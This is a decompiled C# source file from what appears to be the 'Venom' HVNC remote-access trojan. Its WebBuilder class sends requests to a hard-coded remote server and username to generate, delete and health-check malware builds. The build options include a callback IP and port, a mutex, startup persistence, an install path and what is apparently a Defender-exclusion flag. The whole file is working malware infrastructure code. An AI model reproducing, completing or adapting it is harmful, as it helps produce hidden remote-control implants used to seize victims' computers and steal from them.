using System;
using System.IO;
using System.Net;

namespace HVNC.WebBuilder
{
	// Token: 0x02000020 RID: 32
	internal class WebBuilder
	{
		// Token: 0x0600011B RID: 283 RVA: 0x00010B50 File Offset: 0x0000ED50
		public static string SendBuild(string ip, string port, string id, string mutex, string startup, string path, string folder, string filename, string wdex, string hhvnc)
		{
			string result;
			try
			{
				WebRequest webRequest = WebRequest.Create(string.Concat(new string[]
				{
					WebBuilder.Server,
					"?user=",
					WebBuilder.Username,
					"&action=build&ip=",
					ip,
					"&port=",
					port,
					"&id=",
					id,
					"&mutex=",
					mutex,
					"&startup=",
					startup,
					"&path=",
					path,
					"&folder=",
					folder,
					"&filename=",
					filename,
					"&wdex=",
					wdex,
					"&hhvnc=",
					hhvnc
				}));
				webRequest.Method = "GET";
				string text = new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
				if (text.Contains("Build Completed"))
				{
					result = "success";
				}
				else if (text.Contains("Invalid Arguments"))
				{
					result = "invalid-arguments";
				}
				else if (text.Contains("missing-args"))
				{
					result = "missing-args";
				}
				else if (text.Contains("User Not-Found OR Expired!"))
				{
					result = "invalid-user-or-expired";
				}
				else
				{
					result = "false";
				}
			}
			catch (WebException)
			{
				result = "error";
			}
			return result;
		}

		// Token: 0x0600011C RID: 284 RVA: 0x00010CB4 File Offset: 0x0000EEB4
		public static string DeleteOldBuild()
		{
			string result;
			try
			{
				WebRequest webRequest = WebRequest.Create(WebBuilder.Server + "?user=" + WebBuilder.Username + "&action=delete");
				webRequest.Method = "GET";
				if (new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd().Contains("deleted"))
				{
					result = "success";
				}
				else
				{
					result = "false";
				}
			}
			catch (WebException)
			{
				result = "error";
			}
			return result;
		}

		// Token: 0x0600011D RID: 285 RVA: 0x00010D34 File Offset: 0x0000EF34
		public static string IsBuilderAlive()
		{
			string result;
			try
			{
				WebRequest webRequest = WebRequest.Create(WebBuilder.Server + "?user=" + WebBuilder.Username + "&action=alive");
				webRequest.Method = "GET";
				if (new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd().Contains("alive"))
				{
					result = "alive";
				}
				else
				{
					result = "false";
				}
			}
			catch (WebException)
			{
				result = "error";
			}
			return result;
		}

		// Token: 0x040000CB RID: 203
		public static string Server = "http://91.134.207.23:5337/venom/index.php";

		// Token: 0x040000CC RID: 204
		public static string Username = "venomclients";

		// Token: 0x040000CD RID: 205
		public static string DownloadURL = "http://91.134.207.23:5337/venom/";
	}
}
